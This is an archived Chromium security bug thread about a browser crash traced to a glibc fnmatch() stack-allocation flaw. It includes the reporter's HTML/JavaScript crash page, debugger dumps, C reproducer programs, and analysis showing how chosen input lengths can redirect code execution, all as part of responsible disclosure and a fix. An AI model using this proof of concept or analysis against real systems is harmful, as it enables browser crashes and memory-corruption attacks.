# Crash in third_party xdg_mime library when unable to handle long file paths

| Field | Value |
|-------|-------|
| **Issue ID** | [40082069](https://issues.chromium.org/issues/40082069) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P0 |
| **Component** | Internals |
| **Platforms** | Linux |
| **Reporter** | ls...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2010-07-09 |
| **Bounty** | $1,337.00 |

## Description

Hi again,

uname -a 
Linux berlin 2.6.32-22-generic #36-Ubuntu SMP Thu Jun 3 22:02:19 UTC 2010 i686 GNU/Linux

Firefox: OK
Chrome 5.0.375.99 (latest): (Segmentation Fault) completely crashes with no sad face

Under windows get an aw snap screen with sad face.

This may be the sick function _xdg_glob_hash_lookup_file_name (base/third_party/xdg_mime/xdgmimeglob.c), it appears a quick fix was applied a couple of weeks ago?

..also I couldn't figure out how a regular exp like this could be useful. __fnmatch (pattern=0xa42e1e0 "*.anim[1-9j]", string=0xb0986014 "foo.", 'A' <repeats 196 times>..., flags=0) at fnmatch.c

The following html will cause the crash

<HTML>
<HEAD>
<script language="Javascript">
function go(){
	var str = "AAAAAA";
	var finalstr = crapLoadOfAA(str, 400000);
	makeEmbed(finalstr);
}

function crapLoadOfAA (str, num) {
 var i = Math.ceil(Math.log(num) / Math.LN2),
  res = str;
 do {
  res += res;
 } while (0 < --i);
 return res.slice(0, str.length * num);
}

function makeEmbed(str) { 
   // Browser Segs
   ifrm = document.createElement("EMBED"); 
   ifrm.setAttribute("type", ""); 
   ifrm.setAttribute("src", "://www."+str); 
   document.body.appendChild(ifrm); 
   
   /* Just an Aw, Snap!
   ifrm = document.createElement("IFRAME");  
   ifrm.setAttribute("src", "http://www."+str); 
   document.body.appendChild(ifrm); 
   */
} 
</script>
</HEAD>
<BODY>
<p><a href="#" onMouseDown="go()">Punch It!</a></p> 
</BODY>
</HTML>


I have attached the crash info.

LSatchel


## Attachments

- [chrome.txt](attachments/chrome.txt) (text/plain, English; charset=us-ascii, 15.0 KB)
- [chrome2.txt](attachments/chrome2.txt) (text/plain, English; charset=utf-8, 16.8 KB)

## Timeline

### sc...@gmail.com (2010-07-09)

Thanks for the report. This has to be my favourite function name ever: crapLoadOfAA :D
We'll look into it.

In the cases of these crashes, do you have the faulting ASM instruction at EIP to hand? That one missing piece is very useful to quickly gauge severity.

### js...@chromium.org (2010-07-09)

All I get is a sad tab on OOM. The renderer just exhausts memory while sending an IPC message to the browser, so the browser process terminates the renderer due to the incomplete IPC. Maybe the Linux version is exhausting the renderer first?

@cdn - Can you take a look?


### ls...@gmail.com (2010-07-09)

[Comment Deleted]

### ls...@gmail.com (2010-07-09)

  disas: 
   0x00fc9492 <+530>:	cmp    $0xffffffff,%eax
   0x00fc9495 <+533>:	mov    %eax,%edi
   0x00fc9497 <+535>:	je     0xfc94fe <__fnmatch+638>
   0x00fc9499 <+537>:	lea    0x1(%eax),%ecx
   0x00fc949c <+540>:	lea    0x10(,%ecx,4),%eax
   0x00fc94a3 <+547>:	sub    %eax,%esp
   0x00fc94a5 <+549>:	lea    0x1f(%esp),%edx
   0x00fc94a9 <+553>:	and    $0xfffffff0,%edx
   0x00fc94ac <+556>:	cmpl   $0x0,-0x18(%ebp)
   0x00fc94b0 <+560>:	jne    0xfc951a <__fnmatch+666>
   0x00fc94b2 <+562>:	mov    -0x20(%ebp),%eax
=> 0x00fc94b5 <+565>:	mov    %edx,(%esp)
   0x00fc94b8 <+568>:	mov    %edx,-0x24(%ebp)
   0x00fc94bb <+571>:	mov    %esi,0xc(%esp)
   0x00fc94bf <+575>:	mov    %ecx,0x8(%esp)
   0x00fc94c3 <+579>:	mov    %eax,0x4(%esp)
   0x00fc94c7 <+583>:	call   0xfa4a00 <__mbsrtowcs>
   0x00fc94cc <+588>:	mov    -0x24(%ebp),%edx
   0x00fc94cf <+591>:	jmp    0xfc93cc <__fnmatch+332>
   0x00fc94d4 <+596>:	lea    -0x22ca8(%ebx),%eax
   0x00fc94da <+602>:	mov    %eax,0xc(%esp)
   0x00fc94de <+606>:	movl   $0x175,0x8(%esp)

I was stepping through last night and it jumps off to invalid memory in _xdg_glob_hash_lookup_file_name (I think). I'll try reproduce


### sc...@gmail.com (2010-07-10)

Heh, that assembly shows that something interesting is going on.

Crash is writing to (%esp) which suggests the stack has grown down out-of-bounds. Normally this would be due to an infinite stack recursion but in this instance there is some form of dynamic stack allocation going on:

   0x00fc94a3 <+547>:	sub    %eax,%esp

This would typically be due to alloca() or a dynamically sized stack-array. Weird that Linux fnmatch() is using this. Presumably, an overly-large value was in %eax, but we can't tell since the value has been clobbered by the time of the crash register capture.


### ls...@gmail.com (2010-07-10)

[Comment Deleted]

### js...@chromium.org (2010-07-11)

[Empty comment from Monorail migration]

### in...@chromium.org (2010-07-12)

[Empty comment from Monorail migration]

### in...@chromium.org (2010-07-12)

[Empty comment from Monorail migration]

### in...@chromium.org (2010-07-12)

[Empty comment from Monorail migration]

### in...@chromium.org (2010-07-12)

Sent an email to the xdg-mime authors. I will be committing our workaround patch shortly.

### bu...@gmail.com (2010-07-12)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=52130 

------------------------------------------------------------------------
r52130 | inferno@chromium.org | 2010-07-12 14:22:12 -0700 (Mon, 12 Jul 2010) | 6 lines
Changed paths:
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/base/mime_util.cc?r1=52130&r2=52129

Fixes a crash when xdg_mime library is unable to handle a long file path.

BUG=48733
TEST=None

Review URL: http://codereview.chromium.org/2980002
------------------------------------------------------------------------


### in...@chromium.org (2010-07-12)

[Empty comment from Monorail migration]

### ls...@gmail.com (2010-07-12)

May I ask guys.. what kind of bugs qualify for your reward scheme?

### da...@chromium.org (2010-07-14)

[Comment Deleted]

### in...@chromium.org (2010-07-14)

lsatchel, we are still evaluating the severity of this issue and whether it will qualify for a reward (the problem is in an underlying third-party library and we are trying to evaluate the exploitability vectors). For more information about our reward program, please see the faq at http://blog.chromium.org/2010/01/encouraging-more-chromium-security.html.

### ls...@gmail.com (2010-07-14)

No problem inferno, was just interested & thank you for the helpful link. 

### sc...@gmail.com (2010-07-14)

@lsatchel: generally, a SecSeverity-High has an excellent chance of qualifying for a reward. We also sometimes reward interesting bugs that aren't our "fault", such as the recent libpng bug. Even if this bug ends up in fnmatch(), it may still qualify as "interesting" :)

### bu...@gmail.com (2010-07-14)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=52344 

------------------------------------------------------------------------
r52344 | inferno@chromium.org | 2010-07-14 11:02:31 -0700 (Wed, 14 Jul 2010) | 9 lines
Changed paths:
   M http://src.chromium.org/viewvc/chrome/branches/375/src/net/base/mime_util.cc?r1=52344&r2=52343

Merge 52130 - Fixes a crash when xdg_mime library is unable to handle a long file path.

BUG=48733
TEST=None

Review URL: http://codereview.chromium.org/2980002

TBR=inferno@chromium.org
Review URL: http://codereview.chromium.org/2962017
------------------------------------------------------------------------


### in...@chromium.org (2010-07-14)

[Empty comment from Monorail migration]

### sc...@gmail.com (2010-07-16)

@inferno, @cdn: did we ever root-cause this? I wish this laptop could handle a debuggable build of Chrome :-/

### in...@chromium.org (2010-07-17)

working on it,

backtrace::
#0  0x00007ffff15fb7dd in utf8_internal_loop (step=<value optimized out>, 
    data=<value optimized out>, inptrp=0x7fffe718a4a8, inend=0x7fffb7f88f1d "", outbufstart=0x0, 
    irreversible=<value optimized out>, do_flush=0, consume_incomplete=1) at ../iconv/loop.c:332
        ch = 65
#1  __gconv_transform_utf8_internal (step=<value optimized out>, data=<value optimized out>, 
    inptrp=0x7fffe718a4a8, inend=0x7fffb7f88f1d "", outbufstart=0x0, 
    irreversible=<value optimized out>, do_flush=0, consume_incomplete=1)
    at ../iconv/skeleton.c:611
        trans = <value optimized out>
        inptr = 0x7fffb7d89ad9 'A' <repeats 200 times>...
        lirreversiblep = 0x7fffe718a2e8
        outbuf = 0x7fffe72b5004 ""
        outend = 0x7fffe7ab2114 "\377\177"
        lirreversible = 0
        next_step = 0x7ffff7e98068
        next_data = 0x7fffe718a4a8
        fct = 0
        status = 4
        __PRETTY_FUNCTION__ = "__gconv_transform_utf8_internal"
#2  0x00007ffff16701d9 in __mbsrtowcs_l (dst=<value optimized out>, src=<value optimized out>, 
    len=<value optimized out>, ps=<value optimized out>, l=<value optimized out>)
    at mbsrtowcs_l.c:124
        srcp = 0x7fffb7d3f018 "foo.", 'A' <repeats 196 times>...
        srcend = 0x7fffb7f88f1d ""
        data = {__outbuf = 0x7fffe718a500 "f", __outbufend = 0x7fffe7ab2114 "\377\177", 
          __flags = 1, __invocation_counter = 0, __internal_use = 1, __statep = 0x7fffe7ab21b0, 
          __state = {__count = 0, __value = {__wch = 0, __wchb = "\000\000\000"}}, __trans = 0x0}
        result = <value optimized out>
        status = <value optimized out>
        towc = 0x7ffff7e98000
        non_reversible = 0
        fcts = <value optimized out>
        fct = 0x7ffff15fb690 <__gconv_transform_utf8_internal>
        __PRETTY_FUNCTION__ = "__mbsrtowcs_l"
#3  0x00007ffff168b6d1 in __fnmatch (pattern=0x7fffe489f280 "*.anim[1-9j]", 
    string=0x7fffb7d3f018 "foo.", 'A' <repeats 196 times>..., flags=0) at fnmatch.c:410
        ps = {__count = 0, __value = {__wch = 0, __wchb = "\000\000\000"}}
        n = 2400004
        p = 0x7fffb7d3f018 "foo.", 'A' <repeats 196 times>...
        wpattern = 0x7fffe7ab2130 L"*.anim[1-9j]"
        wstring = 0x7fffe718a500 L"foo.", 'A' <repeats 196 times>...
        __PRETTY_FUNCTION__ = "__fnmatch"
#4  0x0000000001a69e73 in _xdg_glob_hash_lookup_file_name (glob_hash=0x7fffbbc1ae80, 
    file_name=0x7fffb7d3f018 "foo.", 'A' <repeats 196 times>..., mime_types=0x7fffe7ab2318, 
    n_mime_types=1) at base/third_party/xdg_mime/xdgmimeglob.c:406
        list = 0x7fffbbc1ad80
        i = 0
---Type <return> to continue, or q <return> to quit---
        n = 0
        mimes = {{mime = 0x7fffe7ab2250 "p\"\253\347\377\177", weight = -408214624}, {
            mime = 0x7fffe7ab2250 "p\"\253\347\377\177", weight = 26945248}, {mime = 0x0, 
            weight = -527530272}, {mime = 0x7fffe7ab2270 "\340\"\253\347\377\177", 
            weight = 90717347}, {mime = 0x0, weight = -527530272}, {
            mime = 0x7fffe7ab22e0 "\360\"\253\347\377\177", weight = 27681380}, {mime = 0x0, 
            weight = 27679681}, {mime = 0x7fffe7ab22c0 "\266\356\377\377\377\177", 
            weight = -527530272}, {mime = 0x7fffffffeee4 "", weight = -1144935008}, {
            mime = 0x7fffffffed49 "/home/aarya", weight = -4380}}
        n_mimes = 10
        len = 2400004
        __PRETTY_FUNCTION__ = "_xdg_glob_hash_lookup_file_name"
#5  0x0000000001a669a8 in xdg_mime_get_mime_type_from_file_name (
    file_name=0x7fffb7d3f018 "foo.", 'A' <repeats 196 times>...)
    at base/third_party/xdg_mime/xdgmime.c:572
        mime_type = 0x7fffe7ab23b0 "\030\360\323\267\377\177"
#6  0x00000000019f21e1 in mime_util::GetFileMimeType (filepath=...) at base/mime_util_xdg.cc:549
No locals.
#7  0x0000000001f51637 in net::PlatformMimeUtil::GetPlatformMimeTypeFromExtension (
    this=0x7fffe19896c0, ext='A' <repeats 2400000 times>, result=0x7fffe7ab2670)
    at net/base/platform_mime_util_linux.cc:22
        dummy_path = {static kSeparators = 0x361f661 "/", 
          static kCurrentDirectory = 0x361f663 ".", static kParentDirectory = 0x361f665 "..", 
          static kExtensionSeparator = 46 '.', path_ = "foo.", 'A' <repeats 2400000 times>}
        out = Traceback (most recent call last):
  File "/usr/share/gdb/python/libstdcxx/v6/printers.py", line 501, in to_string
    nchars = min(length, limit)
RuntimeError: Cannot access memory at address 0x7fffba2b3

#8  0x0000000001f3c452 in net::MimeUtil::GetMimeTypeFromExtension (this=0x7fffe19896c0, ext=
    'A' <repeats 2400000 times>, result=0x7fffe7ab2670) at net/base/mime_util.cc:166
        ext_narrow_str = 'A' <repeats 2400000 times>
        mime_type = 0x0


### in...@chromium.org (2010-07-17)

@cevans, @cdn - it does look like a null deference.check out frame #0 and outbufstart=0x0 and line 332 in loop.c is   "unsigned char *outptr = *outptrp;" in function below

static inline int
SINGLE(LOOPFCT) (struct __gconv_step *step,
                 struct __gconv_step_data *step_data,
                 const unsigned char **inptrp, const unsigned char *inend,
                 unsigned char **outptrp, unsigned char *outend,
                 size_t *irreversible EXTRA_LOOP_DECLS)
{
  mbstate_t *state = step_data->__statep;
#ifdef LOOP_NEED_FLAGS
  int flags = step_data->__flags;
#endif
#ifdef LOOP_NEED_DATA
  void *data = step->__data;
#endif
  int result = __GCONV_OK;
  unsigned char bytebuf[MAX_NEEDED_INPUT];
  const unsigned char *inptr = *inptrp;
  unsigned char *outptr = *outptrp;

@cdn - what do you think ??

### sc...@gmail.com (2010-07-17)

@inferno -- can you give the registers at the time of the fault, as well as the asm instruction that executed to cause the fault?

### in...@chromium.org (2010-07-18)

(gdb) frame 0
#0  0x00007ffff15fb7dd in utf8_internal_loop (step=<value optimized out>, 
    data=<value optimized out>, inptrp=0x7fffe718a4a8, inend=0x7fffb8630f1d "", outbufstart=0x0, 
    irreversible=<value optimized out>, do_flush=0, consume_incomplete=1) at ../iconv/loop.c:332
332	in ../iconv/loop.c
(gdb) info registers
rax            0x7fffb8431ad8	140736284793560
rbx            0x7fffe72b5000	140737071763456
rcx            0x0	0
rdx            0x41	65
rsi            0x7fffe72b5004	140737071763460
rdi            0x7fffb8431ad9	140736284793561
rbp            0x7fffb8630f1d	0x7fffb8630f1d
rsp            0x7fffe718a260	0x7fffe718a260
r8             0x0	0
r9             0x0	0
r10            0x7fffe718a2e0	140737070539488
r11            0x7ffff168b4b0	140737243559088
r12            0x7fffb83e7018	140736284487704
r13            0x7fffe7ab2114	140737080140052
r14            0x7fffe718a4a8	140737070539944
r15            0x7fffe718a500	140737070540032
rip            0x7ffff15fb7dd	0x7ffff15fb7dd <__gconv_transform_utf8_internal+333>
eflags         0x10293	[ CF AF SF IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0

and asm intruction is => 0x00007ffff15fb7dd <+333>:	mov    %edx,(%rbx)

0x00007ffff15fb7bc <+300>:	jmp    0x7ffff15fb7cd <__gconv_transform_utf8_internal+317>
   0x00007ffff15fb7be <+302>:	xchg   %ax,%ax
   0x00007ffff15fb7c0 <+304>:	lea    0x4(%rbx),%rsi
   0x00007ffff15fb7c4 <+308>:	cmp    %rsi,%r13
   0x00007ffff15fb7c7 <+311>:	jb     0x7ffff15fba5f <__gconv_transform_utf8_internal+975>
   0x00007ffff15fb7cd <+317>:	movzbl (%rax),%edx
   0x00007ffff15fb7d0 <+320>:	cmp    $0x7f,%edx
   0x00007ffff15fb7d3 <+323>:	ja     0x7ffff15fb9c9 <__gconv_transform_utf8_internal+825>
   0x00007ffff15fb7d9 <+329>:	lea    0x1(%rax),%rdi
=> 0x00007ffff15fb7dd <+333>:	mov    %edx,(%rbx)
   0x00007ffff15fb7df <+335>:	mov    %rdi,%rax
   0x00007ffff15fb7e2 <+338>:	mov    %rsi,%rbx
   0x00007ffff15fb7e5 <+341>:	cmp    %rax,%rbp
   0x00007ffff15fb7e8 <+344>:	jne    0x7ffff15fb7c0 <__gconv_transform_utf8_internal+304>
   0x00007ffff15fb7ea <+346>:	mov    %rbp,%rax

### sc...@gmail.com (2010-07-18)

Hmm. Looks pretty ugly to me. Looks more like a buffer overflow to me:

- Fault is due to writing to the %rbx register (64-bit version of register %ebx).
- Faulting address is 0x7fffe72b5000 -- note how the last three hex digits are 000. This typically indicates going off the end of a page into unmapped space.
- Write off the end of a page => buffer overflow.

Also note how the value being written in a 32-bit representation of the character "A" in %edx (0x41) -- so the data being written is under the control of the attacker, which is rarely a good sign.

And of course, this is different from the big-stack-frame crash symptom reported by lsatchel in https://crbug.com/chromium/48733#c4.

I am starting to become fascinated by this bug.

### sc...@gmail.com (2010-07-18)

I can't reproduce it at the fnmatch() API level with anything like:

#include <fnmatch.h>
#include <stdlib.h>
#include <string.h>

int main() {
  int num_as = 6 * 400000;
  char* p = malloc(num_as + 5);
  memset(p, 'A', num_as + 5);
  p[0] = 'f';
  p[1] = 'o';
  p[2] = 'o';
  p[3] = '.';
  p[num_as + 4] = '\0';
  return fnmatch("*.anim[1-9j]", p, 0);
}

I also fiddled around with "export LANG=en_US.UTF-8"...

We can sit down and look at this more in the debugger together this week if you like.

### in...@chromium.org (2010-07-18)

Cheers Chris. Looks like we caught a nice bug :). I can reproduce the segmentation fault with this program.

#include <fnmatch.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <locale.h>

int main() {
  setlocale(LC_ALL, "en_US.UTF-8");
  unsigned long num_as = 6 * 4000000;
  char* p = (char*) malloc(num_as + 4);
  memset(p, 'A', num_as + 3);
  p[0] = 'f';
  p[1] = 'o';
  p[2] = 'o';
  p[3] = '.';
  p[num_as + 4] = '\0';
  printf ("Output:: %d \n", fnmatch("*.anim[1-9j]", p, 0));
  return 0;
}


### in...@chromium.org (2010-07-18)

[Empty comment from Monorail migration]

### ls...@gmail.com (2010-07-18)

[Comment Deleted]

### ls...@gmail.com (2010-07-18)

[Comment Deleted]

### ls...@gmail.com (2010-07-18)

Good Job Guys,

I tried isolating something similar to scary beasts code before submission. Fairplay @inferno for fully isolating :)

Yay! A GNU C Library Bug

Why is it sometimes crashing here... is this a separate issue or a manifestation within fnmatch??
#0  0x00007ffff15fb7dd in utf8_internal_loop (step=<value optimized out>, 
    data=<value optimized out>, inptrp=0x7fffe718a4a8, inend=0x7fffb7f88f1d "", outbufstart=0x0, 
    irreversible=<value optimized out>, do_flush=0, consume_incomplete=1) at ../iconv/loop.c:332
        ch = 65

LSatchel


### sc...@gmail.com (2010-07-19)

Although hardly Chromium's fault, this is SecSeverity-Critical. We'll work around this glibc bug. I will post more analysis in the next comment.

@lsatchel - the rewards panel is discussing this case. I'll let you know how it goes.

### sc...@gmail.com (2010-07-19)

Ok I analyzed this on a long plane ride. It comes down to this asm code in fnmatch:

CHUNK A:
0xb769671b <fnmatch+507>:	lea    0x1(%eax),%ecx
0xb769671e <fnmatch+510>:	lea    0x10(,%ecx,4),%eax
0xb7696725 <fnmatch+517>:	sub    %eax,%esp
...
CHUNK B:
0xb769673f <fnmatch+543>:	mov    %ecx,0x8(%esp)
0xb7696743 <fnmatch+547>:	mov    %edx,(%esp)
0xb7696746 <fnmatch+550>:	mov    %eax,0xc(%esp)

Unfortunately I didn't have the fnmatch() source but it's pretty clear what is going on.

CHUNK A represents the setup of a dynamically-sized stack frame and the pseudo-code would be:

size_t len = utf_strlen(string);
wchar_t* buf = alloca(len * sizeof(wchar_t));

(of course, it may look like GCC's array extension in the code itself:
wchar_t buf[size];
)

As can be seen, there is even an integer overflow with input string lengths >= 2^30 :)

The problem is that the Linux toolchain's handling of dynamically sized stack chunks does not fault in the extended stack page-by-page. This means that the stack can be collided with e.g. the heap, or any VMA chunk really.

The usual crash when playing with this is to fault when trying to write to an out-of-bounds %esp in chunk B. But with careful choice of length of the input chunk, you will see other manifestations. For example with the test code provided below and "./a.out 37200000", %esp ends up in the middle of the mmap() chunk being used to hold the input string! This leads to corruption and a crash writing off the end of this chunk which looks like a buffer overflow and is simply a manifestation of the corrupt %esp.

Another crash I see is somewhat alarming: "./a.out 1073741796" ends up wrapping and corrupting %esp by a small amount (i.e. increasing it rather than decreasing it) with the eventual side effect that _code execution_ jumps into the input buffer. (On my 32-bit Ubuntu 9.04 laptop kernel, there is no NX so the processor executes a large amount of "inc    %ecx" instructions == 0x41 == 'A' ;-)

### sc...@gmail.com (2010-07-19)

Oh, here's the test prog I was using:

#include <err.h>
#include <fnmatch.h>
#include <locale.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, const char* argv[]) {
  size_t num_as;
  char* p;
  setlocale(LC_ALL, "en_US.UTF8");
  if (argc < 2) {
    errx(1, "Missing argument.");
  }
  num_as = atoi(argv[1]);
  if (num_as < 5) {
    errx(1, "Need 5.");
  }
  p = malloc(num_as);
  if (!p) {
    errx(1, "malloc() failed.");
  }
  memset(p, 'A', num_as);
  p[num_as - 1] = '\0';
  p[0] = 'f';
  p[1] = 'o';
  p[2] = 'o';
  p[3] = '.';
  fnmatch("*.anim[1-9j]", p, 0);
  return 0;
}

### ls...@gmail.com (2010-07-19)

Just referred the info to Firefox.. I hope this was ok? They make use in ipc/chromium/src/base/file_util_posix.cc. 

### sc...@gmail.com (2010-07-19)

@lsatchel: congrats! Although this isn't a bug in Chromium code, it is both serious and also very interesting. Therefore, this bug provisionally qualifies for a $1337 security reward!
We'd be grateful if you could hold off disclosing to too many places until we've shipped a workaround to Chromium users. It is hoped this will happen this week.

Other questions:
1) What name (and optional affiliation) would you like us to use for giving you credit?
2) Would you like me to report this to "vendor-sec"? It's a community of Linux security contacts and vendors. They will likely be interested to discuss workarounds within glibc's fnmatch(), and also the issue of whether Linux should fault-in new stack pages in a more secure manner.

### ls...@gmail.com (2010-07-19)

:) Great news scarybeasts!!

Please, credit to Simon Berry-Byrne (SBerry), throw @inferno and yourself on too if you want(you guys did the heavy lifting)
And yes report to vendor-sec



### js...@chromium.org (2010-07-20)

[Empty comment from Monorail migration]

### [Deleted User] (2010-07-20)

[Empty comment from Monorail migration]

### ro...@chromium.org (2010-07-20)

[Empty comment from Monorail migration]

### sc...@gmail.com (2010-07-27)

@lsatchel: users now protected in 5.0.375.125, courtesy of http://googlechromereleases.blogspot.com/2010/07/stable-channel-update_26.html

Please e-mail me, cevans@chromium.org, and we can set up payment.

I have just e-mailed vendor-sec@ the details too.

### in...@chromium.org (2010-08-03)

ccing Stan from chrome tv team.

### sc...@gmail.com (2010-08-10)

Reward should be on its way. Thanks Simon.

### sc...@gmail.com (2010-09-19)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-03-21)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-10-05)

Batch update.

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/48733?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40082069)*
